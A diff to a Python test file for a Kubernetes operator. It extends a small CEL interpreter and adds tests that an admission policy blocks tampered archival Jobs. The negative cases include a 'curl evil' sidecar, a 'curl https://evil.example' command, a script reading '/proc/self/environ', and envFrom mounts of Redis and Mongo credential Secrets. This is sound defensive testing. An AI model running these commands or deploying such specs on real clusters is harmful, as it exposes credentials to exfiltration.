@@ -8,6 +8,7 @@ namespaced, enumerated verbs, no wildcards, no secrets/volume inspection.
 """
 
 import ast
+import copy
 import re
 import sys
 from pathlib import Path
@@ -2454,12 +2455,14 @@ def test_prune_job_scope_vap_label_keys_match_archival_manifest():
 #
 # The pinned dependency set has no CEL engine, so the "fails admission /
 # passes admission" acceptance criterion is expressed with the minimal
-# interpreter below. It covers exactly the constructs this policy's CEL
-# uses — has(), dotted field paths, string map indexing, == / !=,
-# && / || with CEL's error-absorption truth tables, ! and
-# string.startsWith() — and evaluates the MANIFEST'S OWN expression
-# text, not a re-implementation of its semantics (the
-# encode-the-bug-as-a-feature trap #315 audits for).
+# interpreter below. It covers exactly the constructs this repo's
+# ValidatingAdmissionPolicies use — has(), dotted field paths, string map
+# indexing, integer literals + list indexing, == / !=, && / || with CEL's
+# error-absorption truth tables, !, string.startsWith()/matches(), the
+# zero-arg .size() call, and the .all(var, predicate) macro — and
+# evaluates the MANIFEST'S OWN expression text, not a re-implementation
+# of its semantics (the encode-the-bug-as-a-feature trap #315 audits
+# for).
 
 _OSCM_ARCHIVE_NAME_PREFIX = "oscm-archive-"
 
@@ -2475,6 +2478,7 @@ class _CelError(Exception):
 _CEL_TOKEN = re.compile(
     r"\s*(?:(?P<op>\|\||&&|==|!=|!|[()\[\],.])"
     r"|(?P<str>\"(?:[^\"\\]|\\.)*\"|'(?:[^'\\]|\\.)*')"
+    r"|(?P<num>\d+)"
     r"|(?P<ident>[A-Za-z_][A-Za-z0-9_]*))"
 )
 
@@ -2496,6 +2500,8 @@ def _cel_tokenize(text):
         elif match.group("str") is not None:
             raw = match.group("str")[1:-1]
             tokens.append(("str", re.sub(r"\\(.)", r"\1", raw)))
+        elif match.group("num") is not None:
+            tokens.append(("num", int(match.group("num"))))
         else:
             tokens.append(("ident", match.group("ident")))
     return tokens
@@ -2570,10 +2576,12 @@ class _CelParser:
                 name = self._take("ident")[1]
                 if self._peek() == ("op", "("):
                     self._take()
-                    args = [self._parse_or()]
-                    while self._peek() == ("op", ","):
-                        self._take()
+                    args = []
+                    if self._peek() != ("op", ")"):
                         args.append(self._parse_or())
+                        while self._peek() == ("op", ","):
+                            self._take()
+                            args.append(self._parse_or())
                     self._take("op", ")")
                     node = ("call", node, name, args)
                 else:
@@ -2594,6 +2602,9 @@ class _CelParser:
             self._take("op", ")")
             return node
         if kind == "str":
+            self._take()
+            return ("lit", value)
+        if kind == "num":
             self._take()
             return ("lit", value)
         if kind == "ident":
@@ -2638,7 +2649,13 @@ def _cel_eval(node, ctx):
     if kind == "select":
         return _cel_field(_cel_eval(node[1], ctx), node[2])
     if kind == "index":
-        return _cel_field(_cel_eval(node[1], ctx), _cel_eval(node[2], ctx))
+        receiver = _cel_eval(node[1], ctx)
+        key = _cel_eval(node[2], ctx)
+        if isinstance(receiver, list) and isinstance(key, int) and not isinstance(key, bool):
+            if not 0 <= key < len(receiver):
+                raise _CelError("list index out of range")
+            return receiver[key]
+        return _cel_field(receiver, key)
     if kind == "has":
         target = node[1]
         if target[0] in ("select", "index"):
@@ -2650,12 +2667,46 @@ def _cel_eval(node, ctx):
         _cel_eval(target, ctx)
         return True
     if kind == "call":
+        # The all(var, predicate) macro binds the iteration variable in
+        # a child context (CEL macros are not plain function calls).
+        # Error semantics mirror CEL's: any False predicate short-
+        # circuits to False; an error that never meets a False
+        # propagates (denies under failurePolicy: Fail).
+        if node[2] == "all" and len(node[3]) == 2 and node[3][0][0] == "var":
+            receiver = _cel_eval(node[1], ctx)
+            if not isinstance(receiver, list):
+                raise _CelError("all() requires a list receiver")
+            var, predicate = node[3][0][1], node[3][1]
+            saw_error = False
+            for element in receiver:
+                try:
+                    value = _cel_eval(predicate, {**ctx, var: element})
+                except _CelError:
+                    saw_error = True
+                    continue
+                if value is False:
+                    return False
+                if not isinstance(value, bool):
+                    saw_error = True
+            if saw_error:
+                raise _CelError("error inside all() predicate")
+            return True
         receiver = _cel_eval(node[1], ctx)
         args = [_cel_eval(arg, ctx) for arg in node[3]]
+        if node[2] == "size" and not args:
+            if isinstance(receiver, (list, str, dict)):
+                return len(receiver)
+            raise _CelError("size() requires a list/string/map receiver")
         if node[2] == "startsWith" and len(args) == 1:
             if not isinstance(receiver, str) or not isinstance(args[0], str):
                 raise _CelError("startsWith requires string receiver and argument")
             return receiver.startswith(args[0])
+        if node[2] == "matches" and len(args) == 1:
+            if not isinstance(receiver, str) or not isinstance(args[0], str):
+                raise _CelError("matches requires string receiver and argument")
+            # CEL's matches() is a FULL match (RE2); the anchored #240
+            # pattern carries its own ^...$ anyway.
+            return re.fullmatch(args[0], receiver) is not None
         raise _CelError(f"unsupported method {node[2]!r}")
     if kind in ("eq", "ne"):
         equal = _cel_eval(node[1], ctx) == _cel_eval(node[2], ctx)
@@ -2688,18 +2739,19 @@ def _cel_eval(node, ctx):
     raise _CelError(f"unknown node kind {kind!r}")
 
 
-def _cel_allows(expression, *, obj, old, username=PRUNE_SA_FULL):
+def _cel_allows(expression, *, obj, old, username=PRUNE_SA_FULL, operation="CREATE"):
     """Admission decision for one validation expression: True when the
     expression evaluates truthy (request allowed), False when it
     evaluates falsy OR errors — a CEL error denies under
     `failurePolicy: Fail`, so both paths are rejections. The context
     carries `request.userInfo.username` (default: the prune SA — the
-    principal the policy constrains) so the #565 carve-out disjunct
-    evaluates the way the API server would."""
+    principal the policy constrains) and `request.operation`
+    (default: CREATE) so the #565 carve-out disjunct and the #641
+    operation guard evaluate the way the API server would."""
     ctx = {
         "object": obj,
         "oldObject": old,
-        "request": {"userInfo": {"username": username}},
+        "request": {"userInfo": {"username": username}, "operation": operation},
     }
     tree = _CelParser(_cel_tokenize(expression)).parse()
     try:
@@ -2719,10 +2771,20 @@ def test_prune_job_scope_vap_validations_require_oscm_archive_name_prefix():
     Issue #565 adds a LEADING carve-out disjunct (non-prune actors are
     unrestricted — see the carve-out test below), so the top-level
     shape is now `userInfo != '<prune SA>' || object-clause ||
-    oldObject-clause`: exactly two `||`, three clauses."""
-    full_expr = _strip_cel_whitespace(
-        " ".join(v["expression"] for v in PRUNE_JOB_SCOPE_VAP["spec"]["validations"])
+    oldObject-clause`: exactly two `||`, three clauses. Since #641 the
+    policy carries a SECOND validation (the pod-spec fence), so this
+    test selects the name/labels validation by content — the join-all
+    approach would count the fence's own disjuncts."""
+    name_exprs = [
+        v["expression"]
+        for v in PRUNE_JOB_SCOPE_VAP["spec"]["validations"]
+        if "metadata.name.startsWith" in v["expression"]
+    ]
+    assert len(name_exprs) == 1, (
+        "expected exactly one name/labels validation expression; the "
+        "#641 spec fence must live in its own validations[] entry"
     )
+    full_expr = _strip_cel_whitespace(name_exprs[0])
     assert full_expr.count("||") == 2, (
         "expected the #565 userInfo carve-out disjunct plus exactly "
         "one object-side/oldObject-side disjunction pair; got: "
@@ -2850,6 +2912,259 @@ def test_prune_job_scope_vap_userinfo_carveout_leaves_non_prune_actors_unrestric
     assert _cel_allows(expression, obj=None, old=non_archival) is False, (
         "the prune SA deleting the same non-archival Job must still be "
         "rejected (default username is the prune SA)"
+    )
+
+
+# ---- Issue #641: fence archival-Job image / command / envFrom ----
+#
+# The #294/#398 factors (name prefix + labels) are both spoofable by
+# the very SA the policy constrains — a compromised prune pod names a
+# Job `oscm-archive-evil`, stamps the two labels, and the Job's
+# containers were completely unconstrained: the kubelet resolves
+# `envFrom` against ANY Secret in `openstudio-server` with no RBAC
+# check against the pod's SA, so the exact #294 exfiltration path
+# (ship `openstudio-redis` / the Mongo credential Secret / TLS bundles
+# out as env vars over the archival egress allow) stayed open. The
+# fix adds a SECOND validations[] entry to openstudio-prune-job-scope:
+# every container image == the RCLONE_IMAGE digest, every envFrom
+# secretRef matches the #240 CRD pattern, command pinned to the
+# generator's `/bin/sh -c` envelope (archival.py passes its script via
+# `command` and never sets `args` — full equality is impossible
+# because the script is a pure function of the CR spec), and
+# initContainers/ephemeralContainers (never emitted by the generator)
+# rejected outright. The tests below evaluate the manifest's OWN CEL
+# text with the interpreter above — legit manifest must PASS, each
+# tamper must FAIL — and cross-fence the pinned image literal against
+# archival.RCLONE_IMAGE (the #573 pairing pattern).
+
+_OS_ARCHIVE_SECRET_PATTERN = "^os-archive-[a-z0-9-]+$"
+
+
+def _spec_fence_expression():
+    """The #641 pod-spec fence validation (selected by content so the
+    validations[] entry order is not load-bearing)."""
+    exprs = [
+        v["expression"]
+        for v in PRUNE_JOB_SCOPE_VAP["spec"]["validations"]
+        if "envFrom" in v["expression"]
+    ]
+    assert len(exprs) == 1, (
+        "expected exactly one #641 spec-fence validation expression "
+        "referencing envFrom; got "
+        f"{[e[:60] for e in exprs]!r}"
+    )
+    return exprs[0]
+
+
+def _legit_archival_job():
+    """A real archival Job manifest from the actual generator — the
+    only shape the fence must admit. Includes a datapoint tree so the
+    multi-source script variant is exercised too."""
+    from openstudio_operator.archival import build_archival_job
+    from openstudio_operator.config import StoragePolicy
+
+    return build_archival_job(
+        "64f0c8e2a1b3c4d5e6f7a8b9",
+        StoragePolicy(
+            archive_to_s3=True,
+            backend="s3",
+            bucket="os-archives",
+            secret_ref="os-archive-creds",
+        ),
+        "openstudio-server",
+        datapoint_ids=("64f0c8e2a1b3c4d5e6f7a8c0",),
+    )
+
+
+def test_prune_job_scope_vap_spec_fence_pins_rclone_image_and_secret_pattern_literals():
+    """Issue #641 cross-fence (the #573 name-pair pairing pattern): the
+    image literal pinned inside the CEL must EQUAL archival.RCLONE_IMAGE
+    — single-sourced per #417 — and the envFrom pattern must mirror the
+    #240 CRD `spec.storagePolicy.secretRef` pattern verbatim. If
+    archival.py's digest ever rotates without the CEL following (or
+    vice versa), this fails loudly instead of every legit archival Job
+    stalling at its own admission."""
+    from openstudio_operator.archival import RCLONE_IMAGE
+
+    expr = _strip_cel_whitespace(_spec_fence_expression())
+    assert f"'{RCLONE_IMAGE}'" in expr, (
+        f"the #641 spec fence must pin the archival.RCLONE_IMAGE digest "
+        f"({RCLONE_IMAGE!r}) as a CEL string literal; refresh both "
+        "together (docker buildx imagetools inspect rclone/rclone:<tag>)"
+    )
+    assert f"'{_OS_ARCHIVE_SECRET_PATTERN}'" in expr, (
+        f"the #641 spec fence must mirror the #240 CRD secretRef pattern "
+        f"{_OS_ARCHIVE_SECRET_PATTERN!r} in its envFrom clause"
+    )
+    # The fence must not be part of the #294/#398 name/labels entry —
+    # K8s evaluates each validations[] entry independently, and mixing
+    # them would let a spoofed name satisfy the spec factors too.
+    assert "metadata.name.startsWith" not in expr
+
+
+def test_prune_job_scope_vap_spec_fence_accepts_real_archival_job():
+    """Issue #641 acceptance: the manifest produced by the REAL
+    generator (archival.py::build_archival_job) must PASS the spec
+    fence on CREATE and UPDATE — otherwise the fence is a fence that
+    admits nothing and the retention pipeline stalls at its own spawn.
+    DELETE carries no new object (the `request.operation` guard
+    exempts it, mirroring the first validation's oldObject shape) and
+    must also pass."""
+    expression = _spec_fence_expression()
+    job = _legit_archival_job()
+    assert _cel_allows(expression, obj=job, old=None) is True, (
+        "CREATE of a real archival Job must pass the #641 spec fence — "
+        "the pinned image/command/envFrom factors must match exactly "
+        "what archival.py emits"
+    )
+    assert _cel_allows(expression, obj=job, old=job, operation="UPDATE") is True, (
+        "UPDATE of a real archival Job must pass the #641 spec fence"
+    )
+    assert (
+        _cel_allows(expression, obj=None, old=job, operation="DELETE") is True
+    ), (
+        "DELETE of a real archival Job must pass the #641 spec fence "
+        "(no new object; the operation guard exempts DELETE)"
+    )
+
+
+def test_prune_job_scope_vap_spec_fence_rejects_foreign_image():
+    """Issue #641 factor (a): every container image must equal the
+    pinned RCLONE_IMAGE digest. A wrong tag/digest on the sole
+    container, a digest-stripped `rclone/rclone:1.67.0` (tag-mutation
+    supply-chain window, #124), and a foreign sidecar container are
+    each admission rejects — image identity is not spoofable by
+    relabelling."""
+    expression = _spec_fence_expression()
+    wrong_tag = copy.deepcopy(_legit_archival_job())
+    wrong_tag["spec"]["template"]["spec"]["containers"][0]["image"] = "alpine:latest"
+    assert _cel_allows(expression, obj=wrong_tag, old=None) is False
+    no_digest = copy.deepcopy(_legit_archival_job())
+    no_digest["spec"]["template"]["spec"]["containers"][0]["image"] = (
+        "rclone/rclone:1.67.0"
+    )
+    assert _cel_allows(expression, obj=no_digest, old=None) is False, (
+        "the fence must require the @sha256 digest form (#124), not "
+        "just the tag"
+    )
+    sidecar = copy.deepcopy(_legit_archival_job())
+    sidecar["spec"]["template"]["spec"]["containers"].append(
+        {"name": "exfil", "image": "curlimages/curl:latest", "command": ["/bin/sh", "-c", "set -eu\ncurl evil"]}
+    )
+    assert _cel_allows(expression, obj=sidecar, old=None) is False, (
+        "the fence must check EVERY container, not just containers[0]"
+    )
+
+
+def test_prune_job_scope_vap_spec_fence_rejects_foreign_envfrom_secret():
+    """Issue #641 factor (b) — the minimum bar per the issue: mounting a
+    namespace Secret the archival flow never uses (`openstudio-redis`,
+    the KEDA password — the exact #294 exfiltration path), a
+    correctly-prefixed-but-foreign Secret appended as a second
+    envFrom entry, and a configMapRef-only envFrom entry are each
+    admission rejects. Exfiltration via envFrom fails closed."""
+    expression = _spec_fence_expression()
+    redis = copy.deepcopy(_legit_archival_job())
+    redis["spec"]["template"]["spec"]["containers"][0]["envFrom"] = [
+        {"secretRef": {"name": "openstudio-redis"}}
+    ]
+    assert _cel_allows(expression, obj=redis, old=None) is False, (
+        "envFrom secretRef openstudio-redis (the KEDA password Secret) "
+        "must be rejected — this is the #294 exfiltration path the "
+        "VAP exists to close"
+    )
+    sneaky = copy.deepcopy(_legit_archival_job())
+    sneaky["spec"]["template"]["spec"]["containers"][0]["envFrom"].append(
+        {"secretRef": {"name": "openstudio-mongo"}}
+    )
+    assert _cel_allows(expression, obj=sneaky, old=None) is False, (
+        "a foreign secretRef APPENDED after the legit entry must still "
+        "be rejected — the fence requires EVERY envFrom entry to match "
+        "^os-archive-[a-z0-9-]+$"
+    )
+    cm_only = copy.deepcopy(_legit_archival_job())
+    cm_only["spec"]["template"]["spec"]["containers"][0]["envFrom"] = [
+        {"configMapRef": {"name": "os-archive-config"}}
+    ]
+    assert _cel_allows(expression, obj=cm_only, old=None) is False, (
+        "a configMapRef-only envFrom entry must be rejected — the "
+        "fence requires has(e.secretRef)"
+    )
+
+
+def test_prune_job_scope_vap_spec_fence_rejects_command_override():
+    """Issue #641 factor (c): `command` is pinned to the generator's
+    exact envelope — a foreign argv (`curl`), a `/bin/sh -c` whose
+    script is NOT the generator's `set -eu` prologue, a missing
+    command, and an `args` override on an otherwise-legit container
+    are each admission rejects."""
+    expression = _spec_fence_expression()
+    foreign_argv = copy.deepcopy(_legit_archival_job())
+    foreign_argv["spec"]["template"]["spec"]["containers"][0]["command"] = [
+        "curl",
+        "https://evil.example",
+    ]
+    assert _cel_allows(expression, obj=foreign_argv, old=None) is False
+    wrong_script = copy.deepcopy(_legit_archival_job())
+    wrong_script["spec"]["template"]["spec"]["containers"][0]["command"] = [
+        "/bin/sh",
+        "-c",
+        "cat /proc/self/environ > /mnt/x",
+    ]
+    assert _cel_allows(expression, obj=wrong_script, old=None) is False, (
+        "a /bin/sh -c envelope whose script is not the generator's "
+        "set -eu prologue must be rejected"
+    )
+    no_command = copy.deepcopy(_legit_archival_job())
+    del no_command["spec"]["template"]["spec"]["containers"][0]["command"]
+    assert _cel_allows(expression, obj=no_command, old=None) is False
+    args_override = copy.deepcopy(_legit_archival_job())
+    args_override["spec"]["template"]["spec"]["containers"][0]["args"] = ["--evil"]
+    assert _cel_allows(expression, obj=args_override, old=None) is False, (
+        "args overrides must be rejected — the legit manifest passes "
+        "everything via command and never sets args"
+    )
+
+
+def test_prune_job_scope_vap_spec_fence_rejects_init_and_ephemeral_containers():
+    """Issue #641 completeness: the generator never emits
+    initContainers or ephemeralContainers, so ANY occurrence — even one
+    carrying a pinned image — is an admission reject. This closes the
+    sideload-another-image gap: a containers-only fence would let an
+    unpinned initContainer/ephemeralContainer slip past the image
+    check."""
+    expression = _spec_fence_expression()
+    init = copy.deepcopy(_legit_archival_job())
+    init["spec"]["template"]["spec"]["initContainers"] = [
+        {"name": "sidecar", "image": "busybox:latest"}
+    ]
+    assert _cel_allows(expression, obj=init, old=None) is False
+    ephemeral = copy.deepcopy(_legit_archival_job())
+    ephemeral["spec"]["template"]["spec"]["ephemeralContainers"] = [
+        {"name": "debug", "image": "busybox:latest"}
+    ]
+    assert _cel_allows(expression, obj=ephemeral, old=None) is False
+
+
+def test_prune_job_scope_vap_spec_fence_userinfo_carveout_leaves_non_prune_actors_unrestricted():
+    """Issue #641 keeps the #565 contract: only the prune SA is
+    constrained. A non-prune actor creating the SAME tampered Job
+    (foreign image + foreign envFrom) must NOT be constrained by the
+    spec fence, while the prune SA is denied on it."""
+    expression = _spec_fence_expression()
+    tampered = copy.deepcopy(_legit_archival_job())
+    tampered["spec"]["template"]["spec"]["containers"][0]["image"] = "alpine:latest"
+    tampered["spec"]["template"]["spec"]["containers"][0]["envFrom"] = [
+        {"secretRef": {"name": "openstudio-redis"}}
+    ]
+    human = "kubernetes-admin"
+    assert _cel_allows(expression, obj=tampered, old=None, username=human) is True, (
+        "a non-prune actor must not be constrained by the #641 fence "
+        "(issue #565 carve-out contract)"
+    )
+    assert _cel_allows(expression, obj=tampered, old=None) is False, (
+        "the prune SA creating the tampered Job must be rejected by "
+        "the #641 fence (default username is the prune SA)"
     )
 
 
